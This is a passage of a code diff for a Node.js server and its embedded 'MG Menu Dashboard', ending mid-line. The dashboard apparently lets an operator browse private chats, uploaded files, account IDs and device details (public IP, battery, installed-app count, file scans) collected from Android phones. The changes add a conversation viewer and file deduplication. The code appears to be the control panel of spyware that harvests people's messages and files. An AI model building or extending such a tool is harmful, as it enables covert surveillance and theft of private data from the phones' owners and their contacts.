@@ -333,6 +333,19 @@ async function getMessages(deviceId = "") {
 }
 
 function getFiles(deviceId = "") {
+  const seen = new Set();
+  return readLogs()
+    .filter((item) => item && item.type === "file")
+    .filter((item) => !deviceId || item.device_id === deviceId)
+    .filter((item) => {
+      const key = `${item.device_id}:${item.original}:${item.size}`;
+      if (seen.has(key)) return false;
+      seen.add(key);
+      return true;
+    });
+}
+
+function getRawFiles(deviceId = "") {
   return readLogs()
     .filter((item) => item && item.type === "file")
     .filter((item) => !deviceId || item.device_id === deviceId);
@@ -349,6 +362,7 @@ async function dashboardData() {
   const files = getFiles();
   const accounts = readAccounts();
   const meta = readMessageMeta();
+  const tracks = readTracks();
 
   const msgCounts = new Map();
   const fileCounts = new Map();
@@ -368,6 +382,7 @@ async function dashboardData() {
       });
     }
     const displayAccount = [...deviceAccounts].sort((a, b) => Number(b.last_seen || 0) - Number(a.last_seen || 0))[0];
+    const latestTrack = tracks.find((track) => track.device_id === device.device_id);
     return {
       ...device,
       online: isOnline(device),
@@ -375,7 +390,10 @@ async function dashboardData() {
       account_count: deviceAccounts.length,
       message_count: msgCounts.get(device.device_id) || 0,
       file_count: fileCounts.get(device.device_id) || 0,
-      tracked_message_count: meta.filter((item) => item.device_id === device.device_id).length
+      tracked_message_count: meta.filter((item) => item.device_id === device.device_id).length,
+      android: latestTrack?.android || null,
+      app_count: latestTrack?.app_count || 0,
+      last_track_time: latestTrack?.time || null
     };
   });
 }
@@ -389,9 +407,8 @@ async function accountSummary(deviceId) {
   const byAccount = new Map(finalAccounts.map((account) => [account.key, { ...account, message_count: 0, file_count: 0 }]));
 
   for (const msg of messages) {
-    const key = meta.find((item) => item.device_id === msg.device_id && item.mid === msg.mid)?.account_key;
+    const key = meta.find((item) => item.device_id === msg.device_id && item.mid === msg.mid)?.account_key || accountForMessage(msg, finalAccounts);
     if (key && byAccount.has(key)) byAccount.get(key).message_count += 1;
-    else if (finalAccounts.length === 1) byAccount.get(finalAccounts[0].key).message_count += 1;
   }
   for (const file of files) {
     const key = file.account_key || fallbackAccountKey(deviceId, finalAccounts);
@@ -411,6 +428,15 @@ function filesForAccount(deviceId, rawAccountKey) {
   const accountKeyValue = safeDecode(rawAccountKey);
   const accounts = readAccounts().filter((item) => item.device_id === deviceId);
   return getFiles(deviceId).filter((file) => {
+    if (file.account_key) return file.account_key === accountKeyValue;
+    return fallbackAccountKey(deviceId, accounts) === accountKeyValue;
+  });
+}
+
+function rawFilesForAccount(deviceId, rawAccountKey) {
+  const accountKeyValue = safeDecode(rawAccountKey);
+  const accounts = readAccounts().filter((item) => item.device_id === deviceId);
+  return getRawFiles(deviceId).filter((file) => {
     if (file.account_key) return file.account_key === accountKeyValue;
     return fallbackAccountKey(deviceId, accounts) === accountKeyValue;
   });
@@ -555,6 +581,16 @@ async function handleUpload(req, res, url) {
   const device_id = clean(url.searchParams.get("device_id") || url.searchParams.get("deviceId") || req.headers["x-device-id"] || "unknown");
   const account = latestAccountForDevice(device_id);
   const original = safeName(fileNameFromHeaders(req, url));
+  const logs = readLogs();
+  const duplicate = logs.find((item) =>
+    item.type === "file" &&
+    item.device_id === device_id &&
+    item.original === original &&
+    item.size === buffer.length
+  );
+  if (duplicate) {
+    return json(res, 200, { ok: true, duplicate: true, ...duplicate });
+  }
   const stamp = Date.now();
   const file = `${stamp}_${original}`;
   const thumb = `thumb_${stamp}_${original}`;
@@ -572,7 +608,6 @@ async function handleUpload(req, res, url) {
     size: buffer.length,
     time: nowIso()
   };
-  const logs = readLogs();
   logs.unshift(entry);
   writeLogs(logs);
   json(res, 200, { ok: true, ...entry });
@@ -630,7 +665,7 @@ async function deleteAccount(deviceId, rawAccountKey, includeFiles = true) {
   const deletedMessages = await deleteMessages(deviceId, messages);
   let deletedFiles = 0;
   if (includeFiles) {
-    deletedFiles = deleteFilesByNames(filesForAccount(deviceId, key).map((file) => file.file));
+    deletedFiles = deleteFilesByNames(rawFilesForAccount(deviceId, key).map((file) => file.file));
   }
   writeAccounts(readAccounts().filter((account) => account.key !== key));
   writeMessageMeta(readMessageMeta().filter((item) => item.account_key !== key));
@@ -659,12 +694,12 @@ async function handleDashboardApi(req, res, url) {
       if (req.method === "GET" && parts[5] === "files") return json(res, 200, filesForAccount(deviceId, key));
       if (req.method === "DELETE" && parts.length === 5) return json(res, 200, { ok: true, ...(await deleteAccount(deviceId, key, true)) });
       if (req.method === "DELETE" && parts[5] === "messages") return json(res, 200, { ok: true, deleted: await deleteMessages(deviceId, await messagesForAccount(deviceId, key)) });
-      if (req.method === "DELETE" && parts[5] === "files") return json(res, 200, { ok: true, deleted: deleteFilesByNames(filesForAccount(deviceId, key).map((file) => file.file)) });
+      if (req.method === "DELETE" && parts[5] === "files") return json(res, 200, { ok: true, deleted: deleteFilesByNames(rawFilesForAccount(deviceId, key).map((file) => file.file)) });
     }
     if (req.method === "DELETE" && parts.length === 3) {
       const messages = await getMessages(deviceId);
       const deletedMessages = await deleteMessages(deviceId, messages);
-      const deletedFiles = deleteFilesByNames(getFiles(deviceId).map((file) => file.file));
+      const deletedFiles = deleteFilesByNames(getRawFiles(deviceId).map((file) => file.file));
       writeAccounts(readAccounts().filter((account) => account.device_id !== deviceId));
       writeTracks(readTracks().filter((track) => track.device_id !== deviceId));
       await supabase.from("devices").delete().eq("device_id", deviceId);
@@ -698,8 +733,8 @@ async function dashboardHtml() {
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>MG Menu Dashboard</title>
 <style>
-:root{color-scheme:dark;--bg:#090b10;--panel:#111620;--panel2:#171f2b;--line:#273140;--text:#edf2f7;--muted:#9aa8ba;--accent:#36c5f0;--ok:#34d399;--danger:#fb7185}
-*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:14px}button,input,select{font:inherit}button{border:0;cursor:pointer}.app{display:grid;grid-template-columns:320px 1fr;min-height:100vh}.side{background:#0d1119;border-right:1px solid var(--line);display:flex;flex-direction:column;min-width:0}.brand{padding:18px;border-bottom:1px solid var(--line)}.brand h1{font-size:18px;margin:0 0 10px}.search,.commandbar input,.commandbar select{width:100%;background:#090d14;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:10px;outline:none}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 18px;border-bottom:1px solid var(--line)}.stat,.card,.row,.account,.msg,.file{background:var(--panel);border:1px solid var(--line);border-radius:8px}.stat{padding:10px}.stat b{display:block;font-size:18px}.stat span,.muted{color:var(--muted);font-size:12px}.devices{overflow:auto;padding:10px}.device{width:100%;text-align:left;color:var(--text);background:transparent;border:1px solid transparent;border-radius:8px;padding:11px;margin-bottom:6px}.device:hover,.device.active{background:var(--panel);border-color:var(--line)}.devtop{display:flex;align-items:center;gap:9px}.dot{width:9px;height:9px;border-radius:50%;background:#7b8494;flex:none}.dot.on{background:var(--ok);box-shadow:0 0 14px #34d39980}.devname{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.devmeta{display:flex;gap:12px;color:var(--muted);font-size:12px;margin:7px 0 0 18px}.main{min-width:0;display:flex;flex-direction:column}.topbar{display:flex;justify-content:space-between;gap:12px;padding:18px 22px;border-bottom:1px solid var(--line);background:#0b0f16}.title h2{margin:0;font-size:22px}.title p{margin:4px 0 0;color:var(--muted)}.actions,.toolbar,.fileactions{display:flex;gap:8px;flex-wrap:wrap}.btn{background:var(--panel2);color:var(--text);border:1px solid var(--line);border-radius:8px;padding:9px 11px;text-decoration:none}.btn:hover{border-color:var(--accent)}.btn.danger{color:#ffe4e6;border-color:#883142;background:#301018}.tabs{display:flex;gap:6px;padding:12px 22px 0;background:#0b0f16}.tab{padding:10px 13px;border-radius:8px 8px 0 0;background:transparent;color:var(--muted)}.tab.active{background:var(--panel);color:var(--text)}.commandbar{display:grid;grid-template-columns:1fr 1.4fr 150px 1.4fr auto auto;gap:8px;padding:12px 22px;border-bottom:1px solid var(--line);background:var(--panel)}.content{padding:18px 22px;overflow:auto;flex:1}.cards{display:grid;grid-template-columns:repeat(4,minmax(140px,1fr));gap:12px;margin-bottom:14px}.card{padding:14px}.card b{display:block;font-size:20px;margin-top:5px}.accounts{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px;margin:0 0 14px}.account{padding:12px;text-align:left;color:var(--text)}.account.active{border-color:var(--accent)}.account strong{display:block}.row{display:flex;justify-content:space-between;gap:14px;padding:12px 14px;margin-bottom:8px}.messages{display:flex;flex-direction:column;gap:10px}.msg{max-width:860px;padding:12px}.msg.out{margin-left:auto;border-color:#23546a}.msghead{display:flex;justify-content:space-between;gap:14px;margin-bottom:8px}.sender-name{display:block;font-weight:700}.sender-id{display:block;color:var(--muted);font-size:12px;margin-top:2px}.msgtime{white-space:nowrap;color:var(--muted);font-size:12px}.msgtext{line-height:1.45;white-space:pre-wrap}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(185px,1fr));gap:12px}.file{overflow:hidden}.thumb{aspect-ratio:1.35;background:#070a10;display:grid;place-items:center;color:var(--muted);font-size:34px}.thumb img,.thumb video{width:100%;height:100%;object-fit:cover}.filebody{padding:10px}.filename{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.filemeta{color:var(--muted);font-size:12px;margin:5px 0 10px}.empty{color:var(--muted);padding:40px;text-align:center;border:1px dashed var(--line);border-radius:8px;background:#0d111980}.checkline{display:flex;align-items:center;gap:8px;margin-bottom:8px}.modal{position:fixed;inset:0;background:#000a;display:none;align-items:center;justify-content:center;padding:24px;z-index:10}.modal.open{display:flex}.modalbox{background:var(--panel);border:1px solid var(--line);border-radius:8px;width:min(1000px,96vw);max-height:92vh;overflow:hidden}.modalhead{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 14px;border-bottom:1px solid var(--line)}.modalbody{padding:14px;display:grid;place-items:center;max-height:78vh;overflow:auto}.modalbody img,.modalbody video{max-width:100%;max-height:72vh}
+:root{color-scheme:dark;--bg:#090b10;--panel:#111620;--panel2:#171f2b;--line:#273140;--text:#edf2f7;--muted:#9aa8ba;--accent:#36c5f0;--ok:#34d399;--danger:#fb7185;--bubble-in:#f4f6f8;--bubble-out:#d8f3ff}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:14px}button,input,select{font:inherit}button{border:0;cursor:pointer}.app{display:grid;grid-template-columns:320px 1fr;min-height:100vh}.side{background:#0d1119;border-right:1px solid var(--line);display:flex;flex-direction:column;min-width:0}.brand{padding:18px;border-bottom:1px solid var(--line)}.brand h1{font-size:18px;margin:0 0 10px}.search,.commandbar input,.commandbar select{width:100%;background:#090d14;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:10px;outline:none}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 18px;border-bottom:1px solid var(--line)}.stat,.card,.row,.account,.msg,.file,.conv,.thread{background:var(--panel);border:1px solid var(--line);border-radius:8px}.stat{padding:10px}.stat b{display:block;font-size:18px}.stat span,.muted{color:var(--muted);font-size:12px}.devices{overflow:auto;padding:10px}.device{width:100%;text-align:left;color:var(--text);background:transparent;border:1px solid transparent;border-radius:8px;padding:11px;margin-bottom:6px}.device:hover,.device.active{background:var(--panel);border-color:var(--line)}.devtop{display:flex;align-items:center;gap:9px}.dot{width:9px;height:9px;border-radius:50%;background:#7b8494;flex:none}.dot.on{background:var(--ok);box-shadow:0 0 14px #34d39980}.devname{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.devmeta{display:flex;gap:12px;color:var(--muted);font-size:12px;margin:7px 0 0 18px}.main{min-width:0;display:flex;flex-direction:column}.topbar{display:flex;justify-content:space-between;gap:12px;padding:18px 22px;border-bottom:1px solid var(--line);background:#0b0f16}.title h2{margin:0;font-size:22px}.title p{margin:4px 0 0;color:var(--muted)}.actions,.toolbar,.fileactions{display:flex;gap:8px;flex-wrap:wrap}.btn{background:var(--panel2);color:var(--text);border:1px solid var(--line);border-radius:8px;padding:9px 11px;text-decoration:none}.btn:hover{border-color:var(--accent)}.btn.danger{color:#ffe4e6;border-color:#883142;background:#301018}.tabs{display:flex;gap:6px;padding:12px 22px 0;background:#0b0f16}.tab{padding:10px 13px;border-radius:8px 8px 0 0;background:transparent;color:var(--muted)}.tab.active{background:var(--panel);color:var(--text)}.commandbar{display:grid;grid-template-columns:1fr 1.4fr 150px 1.4fr auto auto;gap:8px;padding:12px 22px;border-bottom:1px solid var(--line);background:var(--panel)}.content{padding:18px 22px;overflow:auto;flex:1}.cards{display:grid;grid-template-columns:repeat(4,minmax(140px,1fr));gap:12px;margin-bottom:14px}.card{padding:14px}.card b{display:block;font-size:20px;margin-top:5px}.accounts{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px;margin:0 0 14px}.account{padding:12px;text-align:left;color:var(--text)}.account.active{border-color:var(--accent)}.account strong{display:block}.row{display:flex;justify-content:space-between;gap:14px;padding:12px 14px;margin-bottom:8px}.info-grid{display:grid;grid-template-columns:repeat(2,minmax(220px,1fr));gap:8px}.messages{display:flex;flex-direction:column;gap:10px}.msg{max-width:860px;padding:12px}.msg.out{margin-left:auto;border-color:#23546a}.msghead{display:flex;justify-content:space-between;gap:14px;margin-bottom:8px}.sender-name{display:block;font-weight:700}.sender-id{display:block;color:var(--muted);font-size:12px;margin-top:2px}.msgtime{white-space:nowrap;color:var(--muted);font-size:12px}.msgtext{line-height:1.45;white-space:pre-wrap}.conv-list{display:flex;flex-direction:column;gap:8px}.conv{display:grid;grid-template-columns:42px 1fr auto;gap:12px;align-items:center;width:100%;text-align:left;color:var(--text);padding:10px 12px}.conv:hover{border-color:var(--accent)}.avatar{width:42px;height:42px;border-radius:50%;display:grid;place-items:center;background:#243044;font-weight:800}.conv-name{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.conv-preview{color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:3px}.conv-meta{text-align:right;color:var(--muted);font-size:12px}.thread{display:flex;flex-direction:column;height:min(68vh,760px);overflow:hidden}.thread-head{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:12px;border-bottom:1px solid var(--line)}.thread-scroll{flex:1;overflow:auto;padding:16px;background:#f2f3f5;color:#111}.bubble-row{display:flex;gap:8px;align-items:flex-end;margin:8px 0}.bubble-row.out{justify-content:flex-end}.bubble{max-width:min(72%,680px);padding:9px 12px;border-radius:10px;background:var(--bubble-in);box-shadow:0 1px 1px #0001;line-height:1.4;white-space:pre-wrap}.bubble-row.out .bubble{background:var(--bubble-out)}.bubble-time{display:block;color:#777;font-size:11px;margin-top:5px;text-align:right}.date-chip{display:block;width:max-content;margin:14px auto 10px;background:#c9cbd0;color:white;border-radius:6px;padding:4px 8px;font-size:12px}.bubble-img{display:block;max-width:220px;max-height:260px;border-radius:8px;margin-top:6px}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(185px,1fr));gap:12px}.file{overflow:hidden}.thumb{aspect-ratio:1.35;background:#070a10;display:grid;place-items:center;color:var(--muted);font-size:34px}.thumb img,.thumb video{width:100%;height:100%;object-fit:cover}.filebody{padding:10px}.filename{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.filemeta{color:var(--muted);font-size:12px;margin:5px 0 10px}.empty{color:var(--muted);padding:40px;text-align:center;border:1px dashed var(--line);border-radius:8px;background:#0d111980}.checkline{display:flex;align-items:center;gap:8px;margin-bottom:8px}.modal{position:fixed;inset:0;background:#000a;display:none;align-items:center;justify-content:center;padding:24px;z-index:10}.modal.open{display:flex}.modalbox{background:var(--panel);border:1px solid var(--line);border-radius:8px;width:min(1000px,96vw);max-height:92vh;overflow:hidden}.modalhead{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 14px;border-bottom:1px solid var(--line)}.modalbody{padding:14px;display:grid;place-items:center;max-height:78vh;overflow:auto}.modalbody img,.modalbody video{max-width:100%;max-height:72vh}
 @media (max-width:850px){.app{grid-template-columns:1fr}.side{max-height:42vh;border-right:0;border-bottom:1px solid var(--line)}.topbar{flex-direction:column}.commandbar{grid-template-columns:1fr 1fr}.cards{grid-template-columns:1fr 1fr}.content{padding:16px}}
 @media (max-width:520px){.cards,.commandbar{grid-template-columns:1fr}.actions{width:100%}.btn{flex:1;text-align:center}.tabs{overflow:auto}.tab{white-space:nowrap}}
 </style>
@@ -720,7 +755,7 @@ async function dashboardHtml() {
 </div>
 <div id="modal" class="modal"><div class="modalbox"><div class="modalhead"><strong id="modalTitle"></strong><button class="btn" id="closeModal">Close</button></div><div id="modalBody" class="modalbody"></div></div></div>
 <script>
-const state={devices:[],selected:null,account:null,accounts:[],tab:"overview",messages:[],files:[]};
+const state={devices:[],selected:null,account:null,accounts:[],tab:"overview",messages:[],files:[],peer:null};
 const $=id=>document.getElementById(id);
 const enc=encodeURIComponent;
 const fmtDate=v=>{if(!v)return "";const d=/^\\d+$/.test(String(v))?new Date(Number(v)):new Date(v);return Number.isFinite(d.getTime())?d.toLocaleString():String(v)};
@@ -728,9 +763,16 @@ const fmtBytes=n=>{n=Number(n)||0;const u=["B","KB","MB","GB"];let i=0;while(n>=
 const esc=s=>String(s??"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
 const isImg=f=>/\\.(png|jpe?g|gif|webp|svg)$/i.test(f||"");
 const isVid=f=>/\\.(mp4|webm|mov)$/i.test(f||"");
+const msgTime=m=>Number(m.message_time||m.received_at||0);
+const peerKey=m=>String(m.peer_uid||m.peer_name||"unknown");
+const dayKey=t=>new Date(t).toDateString();
+function shortTime(v){const d=new Date(Number(v)||v);return Number.isFinite(d.getTime())?d.toLocaleTimeString([], {hour:"2-digit",minute:"2-digit"}):""}
+function previewText(t){const media=parseMedia(t);return media?media.label:String(t||"").replace(/\\s+/g," ").slice(0,90)}
+function parseMedia(t){try{const o=JSON.parse(t);if(o&&o.url)return {url:o.url,label:o.name||"[Image]"} }catch{} return null}
+function conversations(){const map=new Map();for(const m of state.messages){const key=peerKey(m);const item=map.get(key)||{key,peer_uid:m.peer_uid,peer_name:m.peer_name||"Unknown",messages:[],last:null};item.messages.push(m);if(!item.last||msgTime(m)>msgTime(item.last))item.last=m;map.set(key,item)}return [...map.values()].sort((a,b)=>msgTime(b.last)-msgTime(a.last))}
 async function api(url,opts){const r=await fetch(url,opts);if(!r.ok)throw new Error(await r.text());return r.json()}
 async function load(){state.devices=await api("/api/devices");if(!state.selected&&state.devices[0])state.selected=state.devices[0].device_id;renderDevices();await loadSelected()}
-async function loadSelected(){if(!state.selected){renderEmpty();return}state.accounts=await api("/api/device/"+enc(state.selected)+"/accounts");if(!state.account||!state.accounts.find(a=>a.key===state.account))state.account=state.accounts[0]?.key||null;await loadAccount();renderMain()}
+async function loadSelected(){if(!state.selected){renderEmpty();return}state.accounts=await api("/api/device/"+enc(state.selected)+"/accounts");if(!state.account||!state.accounts.find(a=>a.key===state.account))state.account=state.accounts[0]?.key||null;state.peer=null;await loadAccount();renderMain()}
 async function loadAccount(){if(!state.selected||!state.account){state.messages=[];state.files=[];return}const base="/api/device/"+enc(state.selected)+"/account/"+enc(state.account);[state.messages,state.files]=await Promise.all([api(base+"/messages"),api(base+"/files")])}
 function selectedDevice(){return state.devices.find(d=>d.device_id===state.selected)}
 function selectedAccount(){return state.accounts.find(a=>a.key===state.account)}
@@ -738,17 +780,20 @@ function renderDevices(){const q=$("search").value.toLowerCase();const list=stat
 function renderAccounts(){if(!state.accounts.length)return '<div class="empty">No accounts for this device yet</div>';return '<div class="accounts">'+state.accounts.map(a=>'<button class="account '+(a.key===state.account?'active':'')+'" data-account="'+esc(a.key)+'"><strong>'+esc(a.my_name||"Unknown account")+'</strong><span class="muted">Public ID: '+esc(a.public_id||"")+'</span><br><span class="muted">UID: '+esc(a.my_uid||"")+' • Chats '+(a.message_count||0)+' • Files '+(a.file_count||0)+'</span></button>').join("")+'</div>'}
 function renderEmpty(){$("content").innerHTML='<div class="empty">No device selected</div>'}
 function renderMain(){const d=selectedDevice();if(!d)return renderEmpty();const a=selectedAccount();$("deviceTitle").textContent=d.display_name||d.device_id;$("deviceSub").textContent=(d.online?"Online":"Offline")+" • "+(a?(a.my_name||a.public_id||"Unknown account"):"No account selected");document.querySelectorAll(".tab").forEach(t=>t.classList.toggle("active",t.dataset.tab===state.tab));if(state.tab==="overview")renderOverview(d,a);if(state.tab==="chats")renderChats();if(state.tab==="files")renderFiles()}
-function renderOverview(d,a){$("content").innerHTML=renderAccounts()+'<div class="cards"><div class="card"><span>Status</span><b>'+(d.online?'Online':'Offline')+'</b></div><div class="card"><span>Accounts</span><b>'+state.accounts.length+'</b></div><div class="card"><span>Selected chats</span><b>'+state.messages.length+'</b></div><div class="card"><span>Selected files</span><b>'+state.files.length+'</b></div></div><div class="toolbar"><button class="btn danger" id="deleteAccount">Delete selected user</button><button class="btn danger" id="deleteAccountChats">Delete user chats</button><button class="btn danger" id="deleteAccountFiles">Delete user files</button></div><br><div class="row"><span>Device ID</span><strong>'+esc(d.device_id)+'</strong></div><div class="row"><span>Public ID</span><strong>'+esc(a?.public_id||"")+'</strong></div><div class="row"><span>Name</span><strong>'+esc(a?.my_name||"")+'</strong></div><div class="row"><span>UID</span><strong>'+esc(a?.my_uid||"")+'</strong></div>'}
-function renderChats(){if(!state.account){$("content").innerHTML=renderAccounts();return}const tools='<div class="toolbar"><button class="btn" id="selectAllChats">Select all</button><button class="btn danger" id="deleteSelectedChats">Delete selected</button><button class="btn danger" id="deleteAllChats">Delete all user chats</button></div><br>';if(!state.messages.length){$("content").innerHTML=renderAccounts()+tools+'<div class="empty">No chats for this user</div>';return}$("content").innerHTML=renderAccounts()+tools+'<div class="messages">'+state.messages.map(m=>'<div class="msg '+esc(m.direction)+'"><label class="checkline"><input type="checkbox" class="msgcheck" value="'+esc(m.id)+'"><span class="muted">Select</span></label><div class="msghead"><div><span class="sender-name">'+esc(m.peer_name||"Unknown")+'</span><span class="sender-id">Public ID: '+esc(m.peer_uid||"")+' • '+esc(m.direction||"")+'</span></div><span class="msgtime">'+esc(fmtDate(m.received_at||m.message_time))+'</span></div><div class="msgtext">'+esc(m.text||"")+'</div></div>').join("")+'</div>'}
+function renderOverview(d,a){const rows=[["Device ID",d.device_id],["Account name",a?.my_name],["Public ID",a?.public_id],["UID",a?.my_uid],["Model",d.model],["Brand",d.brand],["Android",d.android],["Battery",d.battery_percent!=null?d.battery_percent+"%":""],["IP",d.public_ip],["Network",d.network_type],["Apps",d.app_count],["Last seen",fmtDate(d.server_last_seen)],["Last file scan",fmtDate(d.last_track_time)],["Created",fmtDate(d.created_at)]];$("content").innerHTML=renderAccounts()+'<div class="cards"><div class="card"><span>Status</span><b>'+(d.online?'Online':'Offline')+'</b></div><div class="card"><span>Accounts</span><b>'+state.accounts.length+'</b></div><div class="card"><span>Conversations</span><b>'+conversations().length+'</b></div><div class="card"><span>Selected files</span><b>'+state.files.length+'</b></div></div><div class="toolbar"><button class="btn danger" id="deleteAccount">Delete selected user</button><button class="btn danger" id="deleteAccountChats">Delete user chats</button><button class="btn danger" id="deleteAccountFiles">Delete user files</button></div><br><div class="info-grid">'+rows.map(([k,v])=>'<div class="row"><span>'+esc(k)+'</span><strong>'+esc(v??"")+'</strong></div>').join("")+'</div>'}
+function renderChats(){if(!state.account){$("content").innerHTML=renderAccounts();return}if(!state.peer)return renderChatInbox();return renderChatThread(state.peer)}
+function renderChatInbox(){const convs=conversations();const tools='<div class="toolbar"><button class="btn danger" id="deleteAllChats">Delete all user chats</button></div><br>';if(!convs.length){$("content").innerHTML=renderAccounts()+tools+'<div class="empty">No chats for this user</div>';return}$("content").innerHTML=renderAccounts()+tools+'<div class="conv-list">'+convs.map(c=>'<button class="conv" data-peer="'+esc(c.key)+'"><div class="avatar">'+esc((c.peer_name||"?").trim().charAt(0)||"?")+'</div><div><div class="conv-name">'+esc(c.peer_name||"Unknown")+'</div><div class="muted">Public ID: '+esc(c.peer_uid||"")+'</div><div class="conv-preview">'+esc(previewText(c.last?.text))+'</div></div><div class="conv-meta"><div>'+esc(shortTime(msgTime(c.last)))+'</div><div>'+c.messages.length+' msgs</div></div></button>').join("")+'</div>'}
+function renderChatThread(key){const conv=conversations().find(c=>c.key===key);if(!conv){state.peer=null;return renderChatInbox()}const msgs=[...conv.messages].sort((a,b)=>msgTime(a)-msgTime(b));let lastDay="";const body=msgs.map(m=>{const t=msgTime(m);const day=dayKey(t);const chip=day!==lastDay?'<span class="date-chip">'+esc(new Date(t).toLocaleDateString())+'</span>':"";lastDay=day;const media=parseMedia(m.text);const content=media?'<div>'+esc(media.label)+'</div><img class="bubble-img" src="'+esc(media.url)+'" alt="">':esc(m.text||"");return chip+'<div class="bubble-row '+esc(m.direction)+'"><label><input type="checkbox" class="msgcheck" value="'+esc(m.id)+'"></label><div class="bubble">'+content+'<span class="bubble-time">'+esc(shortTime(t))+'</span></div></div>'}).join("");$("content").innerHTML=renderAccounts()+'<div class="thread"><div class="thread-head"><div><button class="btn" id="backChats">Back</button> <strong>'+esc(conv.peer_name||"Unknown")+'</strong><div class="muted">Public ID: '+esc(conv.peer_uid||"")+'</div></div><div class="toolbar"><button class="btn" id="selectAllChats">Select all</button><button class="btn danger" id="deleteSelectedChats">Delete selected</button><button class="btn danger" id="deleteConversation">Delete conversation</button></div></div><div class="thread-scroll" id="threadScroll">'+body+'</div></div>';setTimeout(()=>{$("threadScroll")?.scrollTo(0,$("threadScroll").scrollHeight)},0)}
 function renderFiles(){if(!state.account){$("content").innerHTML=renderAccounts();return}const tools='<div class="toolbar"><button class="btn" id="selectAllFiles">Select all</button><button class="btn danger" id="deleteSelectedFiles">Delete selected</button><button class="btn danger" id="deleteAllFiles">Delete all user files</button></div><br>';if(!state.files.length){$("content").innerHTML=renderAccounts()+tools+'<div class="empty">No files for this user</div>';return}$("content").innerHTML=renderAccounts()+tools+'<div class="grid">'+state.files.map(f=>{const url="/uploads/"+enc(f.file);const media=isImg(f.file)?'<img src="'+url+'" alt="">':isVid(f.file)?'<video src="'+url+'" muted></video>':'<span>FILE</span>';return '<div class="file"><label class="checkline" style="padding:8px 10px 0"><input type="checkbox" class="filecheck" value="'+esc(f.file)+'"><span class="muted">Select</span></label><button class="thumb" data-preview="'+esc(f.file)+'">'+media+'</button><div class="filebody"><div class="filename">'+esc(f.original||f.file)+'</div><div class="filemeta">'+fmtBytes(f.size)+' • '+esc(fmtDate(f.time))+'</div><div class="fileactions"><a class="btn" href="'+url+'" download>Download</a><button class="btn danger" data-delete-file="'+esc(f.file)+'">Delete</button></div></div></div>'}).join("")+'</div>'}
 function openPreview(file){const url="/uploads/"+enc(file);$("modalTitle").textContent=file;$("modalBody").innerHTML=isImg(file)?'<img src="'+url+'" alt="">':isVid(file)?'<video src="'+url+'" controls autoplay></video>':'<a class="btn" href="'+url+'" target="_blank">Open file</a>';$("modal").classList.add("open")}
 async function deletePath(path,msg){if(!confirm(msg))return;await api(path,{method:"DELETE"});await loadSelected();renderDevices()}
-async function deleteSelectedChats(){const ids=[...document.querySelectorAll(".msgcheck:checked")].map(x=>Number(x.value));if(!ids.length)return;await api("/api/messages",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({device_id:state.selected,ids})});await loadSelected()}
+async function deleteSelectedChats(){const ids=[...document.querySelectorAll(".msgcheck:checked")].map(x=>Number(x.value));if(!ids.length)return;await api("/api/messages",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({device_id:state.selected,ids})});await loadAccount();renderChats();renderDevices()}
+async function deleteConversation(){const ids=conversations().find(c=>c.key===state.peer)?.messages.map(m=>m.id)||[];if(!ids.length||!confirm("Delete this conversation?"))return;await api("/api/messages",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({device_id:state.selected,ids})});state.peer=null;await loadAccount();renderChats();renderDevices()}
 async function deleteSelectedFiles(){const files=[...document.querySelectorAll(".filecheck:checked")].map(x=>x.value);if(!files.length)return;await api("/api/files",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({files})});await loadSelected()}
 $("devices").onclick=e=>{const b=e.target.closest(".device");if(!b)return;state.selected=b.dataset.id;state.account=null;renderDevices();loadSelected()};
 $("search").oninput=renderDevices;$("refresh").onclick=load;$("deleteDevice").onclick=()=>state.selected&&deletePath("/api/device/"+enc(state.selected),"Delete this device with all chats and files?");
 document.querySelector(".tabs").onclick=e=>{const b=e.target.closest(".tab");if(!b)return;state.tab=b.dataset.tab;renderMain()};
-$("content").onclick=async e=>{const acc=e.target.closest("[data-account]");if(acc){state.account=acc.dataset.account;await loadAccount();renderMain();return}if(e.target.id==="deleteAccount")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account),"Delete selected user with all chats and files?");if(e.target.id==="deleteAccountChats"||e.target.id==="deleteAllChats")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/messages","Delete all chats for this user?");if(e.target.id==="deleteAccountFiles"||e.target.id==="deleteAllFiles")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/files","Delete all files for this user?");if(e.target.id==="selectAllChats"){document.querySelectorAll(".msgcheck").forEach(x=>x.checked=true);return}if(e.target.id==="selectAllFiles"){document.querySelectorAll(".filecheck").forEach(x=>x.checked=true);return}if(e.target.id==="deleteSelectedChats")return deleteSelectedChats();if(e.target.id==="deleteSelectedFiles")return deleteSelectedFiles();const 